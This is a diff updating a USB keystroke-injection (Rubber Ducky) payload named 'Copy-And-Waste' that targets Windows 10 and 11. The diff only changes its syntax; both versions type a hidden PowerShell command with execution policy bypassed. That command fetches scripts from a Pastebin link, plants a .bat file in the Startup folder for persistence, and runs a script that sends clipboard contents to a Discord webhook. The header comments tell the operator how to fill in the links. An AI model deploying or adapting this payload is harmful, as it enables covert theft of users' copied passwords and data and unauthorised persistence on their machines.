@@ -1,17 +1,19 @@
-REM     Title: Copy-And-Waste
+REM_BLOCK
+Title: Copy-And-Waste
+Author: atomiczsec & I am Jakoby
+Description: This payload is meant to exfiltrate whatever is copied to the clipboard and sends to a discord webhook
+Target: Windows 10, 11
 
-REM     Author: atomiczsec & I am Jakoby
+Remember to replace the link with your pastebin shared link for the intended files to download
+Also remember to put in your discord webhook in c.ps1
+For the PASTEBIN LINK's do not put https:// infront of it, it should look like pastebin.com/raw/BLAHBLAHBLAH
+END_REM
 
-REM     Description: This payload is meant to exfiltrate whatever is copied to the clipboard and sends to a discord webhook
+DEFINE #URL PASTEBIN LINK FOR BAT
 
-REM     Target: Windows 10, 11
-
+DUCKY_LANG US
 DELAY 2000
-GUI
-DELAY
-STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
-ENTER
 
-REM     Remember to replace the link with your pastebin shared link for the intended files to download
-REM     Also remember to put in your discord webhook in c.ps1
-REM     For the PASTEBIN LINK's do not put https:// infront of it, it should look like pastebin.com/raw/BLAHBLAHBLAH
+GUI r
+DELAY 100
+STRINGLN powershell -w h -NoP -NonI -Ep Bypass "echo (iwr #URL).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr #URL).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
